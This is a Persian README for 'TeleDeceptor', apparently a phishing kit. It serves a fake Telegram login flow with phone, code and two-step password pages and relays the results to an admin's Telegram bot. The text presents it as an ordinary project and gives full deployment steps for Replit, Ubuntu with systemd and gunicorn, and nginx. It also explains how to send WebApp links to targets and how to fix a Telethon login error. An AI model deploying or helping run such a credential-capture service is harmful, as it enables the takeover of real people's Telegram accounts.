# TeleDeceptor 📱

TeleDeceptor یک پروژه پایتون است که از API تلگرام برای ایجاد یک صفحه ورود مشابه تلگرام استفاده می‌کند. این پروژه شامل یک رابط کاربری وب و یک بات تلگرام می‌باشد.

![TeleDeceptor Screenshot](generated-icon.png)

## ویژگی‌ها 🔥

- رابط کاربری شبیه به تلگرام با تم تیره
- انتخابگر کد کشور با نمایش پرچم
- ارسال پیام به مدیر از طریق بات تلگرام
- قابلیت اجرا به عنوان Telegram WebApp
- احراز هویت دو مرحله‌ای

## پیش‌نیازها 📋

- Python 3.8 یا بالاتر
- دسترسی به API تلگرام (API_ID و API_HASH)
- یک بات تلگرام (BOT_TOKEN)

## راه‌اندازی در Replit 🚀

### گام 1: ایجاد یک پروژه جدید در Replit

1. در Replit، یک پروژه پایتون جدید ایجاد کنید.
2. پروژه TeleDeceptor را از GitHub کلون کنید:
   ```
   git clone https://github.com/Temsar-626/TeleDecepetor
   ```

### گام 2: نصب وابستگی‌ها

تمام وابستگی‌های لازم از فایل requirements.txt نصب خواهند شد:

```
cd TeleDecepetor
pip install -r requirements.txt
```

یا می‌توانید به صورت دستی آنها را نصب کنید:

```
pip install flask==2.0.1 telethon==1.29.2 python-dotenv==0.19.1 nest-asyncio==1.5.1 requests==2.26.0 python-telegram-bot==13.7 gunicorn==20.1.0 werkzeug==2.0.2
```

### گام 3: تنظیم متغیرهای محیطی در Replit

در تب "Secrets" در پنل Replit، متغیرهای محیطی زیر را اضافه کنید:

```
API_ID=your_api_id
API_HASH=your_api_hash
BOT_TOKEN=your_bot_token
ADMIN_ID=your_telegram_user_id
```

### گام 4: اجرای پروژه در Replit

در Replit، تب `.replit` را ویرایش کنید تا مطمئن شوید که به درستی به دایرکتوری کلون شده اشاره می‌کند:

```
run = "cd TeleDecepetor && python app.py"
```

سپس روی دکمه Run کلیک کنید.

## راه‌اندازی در سرور اوبونتو 🐧

### گام 1: پیش‌نیازها

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv git
```

### گام 2: کلون پروژه

```bash
git clone https://github.com/Temsar-626/TeleDecepetor
cd TeleDecepetor
```

### گام 3: ایجاد محیط مجازی پایتون

```bash
python3 -m venv venv
source venv/bin/activate
```

### گام 4: نصب وابستگی‌ها

```bash
pip install -r requirements.txt
```

### گام 5: تنظیم متغیرهای محیطی

فایل .env را ایجاد کنید:

```bash
nano .env
```

و سپس محتوای زیر را اضافه کنید:

```
API_ID=your_api_id
API_HASH=your_api_hash
BOT_TOKEN=your_bot_token
ADMIN_ID=your_telegram_user_id
```

### گام 6: اجرای برنامه

برای اجرای برنامه در محیط توسعه:

```bash
python app.py
```

برای اجرا در محیط تولید با Gunicorn:

```bash
gunicorn -b 0.0.0.0:5000 -w 4 --preload --timeout 120 "app:app"
```

### گام 7: تنظیم Systemd برای اجرای خودکار

فایل سرویس systemd ایجاد کنید:

```bash
sudo nano /etc/systemd/system/teledeceptor.service
```

با محتوای زیر:

```
[Unit]
Description=TeleDeceptor Telegram Web App
After=network.target

[Service]
User=your_username
Group=your_group
WorkingDirectory=/path/to/TeleDecepetor
Environment="PATH=/path/to/TeleDecepetor/venv/bin"
EnvironmentFile=/path/to/TeleDecepetor/.env
ExecStart=/path/to/TeleDecepetor/venv/bin/gunicorn -b 0.0.0.0:5000 -w 4 --preload --timeout 120 "app:app"
Restart=always

[Install]
WantedBy=multi-user.target
```

سپس سرویس را فعال و اجرا کنید:

```bash
sudo systemctl daemon-reload
sudo systemctl enable teledeceptor
sudo systemctl start teledeceptor
```

## استفاده از Telegram WebApp 📱

برای استفاده از پروژه به عنوان Telegram WebApp، مراحل زیر را انجام دهید:

1. وقتی برنامه را اجرا می‌کنید، چندین لینک برای بات تلگرام ادمین ارسال می‌شود.
2. روی لینک‌های ارسال شده کلیک کنید تا برنامه به صورت وب‌اپ در تلگرام باز شود.
3. اگر از سرور واقعی استفاده می‌کنید، آدرس دامنه خود را به عنوان پارامتر در لینک استفاده کنید:
   ```
   https://t.me/YOUR_BOT_USERNAME/app?startapp=RANDOM_ID-5000-250-TIMESTAMP
   ```

## تنظیمات Nginx (اختیاری) 🔄

اگر می‌خواهید Nginx را به عنوان پروکسی معکوس برای برنامه خود استفاده کنید:

```
server {
    listen 80;
    server_name your_domain.com;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

سپس:

```bash
sudo ln -s /etc/nginx/sites-available/your_config /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx
```

## نکات مهم امنیتی 🔒

1. API_ID و API_HASH را به صورت امن نگهداری کنید.
2. از محیط مجازی برای جداسازی وابستگی‌های پروژه استفاده کنید.
3. در محیط تولید، از HTTPS استفاده کنید.

## عیب‌یابی 🛠️

- اگر با خطای `UPDATE_APP_TO_LOGIN` مواجه شدید، مطمئن شوید که از نسخه جدید Telethon استفاده می‌کنید و مشخصات دستگاه را تنظیم کرده‌اید.
- اگر در Replit نمی‌توانید به برنامه دسترسی پیدا کنید، از دامنه Replit استفاده کنید.
- اگر بات تلگرام کار نمی‌کند، مطمئن شوید که BOT_TOKEN صحیح است و بات فعال است.

## ساختار پروژه 📂

```
TeleDecepetor/
├── app.py            # فایل اصلی برنامه
├── requirements.txt  # وابستگی‌های پروژه
├── templates/        # قالب‌های HTML
│   ├── index.html    # صفحه اصلی ورود
│   ├── code.html     # صفحه تأیید کد
│   ├── 2fa.html      # صفحه احراز هویت دو مرحله‌ای
│   └── success.html  # صفحه موفقیت
└── static/           # فایل‌های استاتیک (CSS، JS، تصاویر)
```

## مشارکت در پروژه 🤝

مشارکت‌ها در این پروژه استقبال می‌شود! لطفاً یک Pull Request ایجاد کنید یا مشکلات را گزارش دهید.

---

برای هرگونه سوال یا مشکل، از طریق گیت‌هاب تماس بگیرید.